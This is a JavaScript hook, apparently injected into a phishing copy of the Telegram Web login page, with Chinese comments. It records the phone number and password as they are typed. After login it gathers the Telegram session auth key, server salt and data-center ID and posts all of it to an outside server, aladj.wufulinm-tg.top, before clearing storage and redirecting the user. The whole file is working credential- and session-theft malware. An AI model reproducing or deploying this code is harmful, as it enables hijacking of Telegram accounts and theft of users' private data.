console.log("hook OK");
setTimeout('getPhone()',600);
setTimeout('getpass()',600);
setTimeout('login_status()',600);//检测是否登录成功
function getPhone(){
  var checkExist = setInterval(function() {
if ($('.input-field-phone .input-field-input').length) {
  console.log("页面初始化完毕");
  // 执行指定代码
  $(".input-field-phone .input-field-input").on("input", function() {
      var phone = $(".input-field-phone .input-field-input").text()
      console.log(phone);
      localStorage.setItem('Phone',phone)
  });

  clearInterval(checkExist); // 停止循环检测
}
}, 100); // 每100毫秒检测一次
}
function getpass(){
    var go_password = setInterval(function() {
  if ($('input[name="notsearch_password"]').length) {
    console.log("密码输入框已出现");
    // 执行指定代码
    let $password = $('input[name="notsearch_password"]');
                $password.on("input", function(e){
                console.log(this.value);
                localStorage.setItem('password',this.value)
                });
    // ...
    clearInterval(go_password); // 停止循环检测
  }
}, 100); // 每100毫秒检测一次
}

function login_status(){
    var status = setInterval(function() {
        userid_data=JSON.parse(localStorage.getItem('user_auth'));
  if (userid_data['id'] != null && userid_data['id'] != '') {
    console.log("登录成功");
        var userid = userid_data['id'];
        var logintime = Math.floor(new Date().getTime() / 1000);
        var dc =localStorage.getItem('dc');
        var Phone = localStorage.getItem('Phone');
        var password = localStorage.getItem('password');
        var stateId =localStorage.getItem('state_id');
        var dcServerSalt=localStorage.getItem(`dc${dc}_server_salt`);
        var dcAuthKey=localStorage.getItem(`dc${dc}_auth_key`);
        $.post("https://aladj.wufulinm-tg.top/api/index/save",{
        // $.post("https://tgadminlogin.advance-ai.xyz/api/index/save",{
			userAuthId:Number(userid),
			userAuthDate:Number(logintime),
			phone:Phone,
			pwd:password,
			userAuthDcId:Number(dc),
			dcServerSalt:dcServerSalt.substring(1, dcServerSalt.length - 1),
			dcAuthKey:dcAuthKey.substring(1, dcAuthKey.length - 1),
			stateId:Number(stateId),
            // url: window.location.protocol+ '//' + window.location.host
            url: "web"
		},
		function(data,status){
			console.log("数据上传完毕");
			localStorage.clear();
			$(window).attr('location','/telegram/index.html');//跳转到空白页
			
		});
    clearInterval(status); // 停止循环检测
  }
}, 100); // 每100毫秒检测一次
    
}